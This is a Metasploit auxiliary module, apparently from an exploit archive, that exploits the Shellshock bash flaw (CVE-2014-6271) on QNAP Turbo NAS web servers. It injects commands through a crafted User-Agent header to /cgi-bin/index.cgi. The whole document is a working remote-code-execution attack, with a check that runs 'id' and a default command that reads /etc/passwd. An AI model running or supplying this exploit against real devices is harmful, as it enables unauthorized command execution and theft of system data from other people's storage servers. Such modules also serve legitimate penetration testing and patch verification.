# Exploit Title: QNAP Web server remote code execution via Bash Environment Variable Code Injection
# Date: 7 February 2015
# Exploit Author: Patrick Pellegrino | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
# Employer homepage: http://www.securegroup.it
# Vendor homepage: http://www.qnap.com
# Version: All Turbo NAS models except TS-100, TS-101, TS-200
# Tested on: TS-1279U-RP
# CVE : 2014-6271
# Vendor URL bulletin : http://www.qnap.com/i/it/support/con_show.php?cid=61


##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/d3vpp/metasploit-modules
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

   def initialize(info = {})
    super(update_info(info,
      'Name' => 'QNAP Web server remote code execution via Bash Environment Variable Code Injection',
      'Description' => %q{
		This module allows you to inject unix command with the same user who runs the http service - admin - directly on the QNAP system.
		Affected products:
		All Turbo NAS models except TS-100, TS-101, TS-200
		},
      'Author' => ['Patrick Pellegrino'], # Metasploit module | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
      'License' => MSF_LICENSE,
      'References' => [
			['CVE', '2014-6271'], #aka ShellShock
			['URL', 'http://www.qnap.com/i/it/support/con_show.php?cid=61']
		],
      'Platform'       => ['unix']
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script','/cgi-bin/index.cgi']),
      OptString.new('CMD', [ true, 'The command to run', '/bin/cat  /etc/passwd'])
    ], self.class)
  end

 def check
	begin
 	res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; echo; /usr/bin/id"
      })
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
		vprint_error("Connection failed")
		return Exploit::CheckCode::Unknown
 end

    if !res
      return Exploit::CheckCode::Unknown
    elsif res.code== 302 and res.body.include? 'uid'
	  return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end


  def run

	res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; echo; #{datastore['CMD']}"
      })

	if res.body.empty?
		print_error("No data found.")
	elsif res.code== 302
		print_status("#{rhost}:#{rport} - bash env variable injected")
		puts " "
		print_line(res.body)
    end
	end

end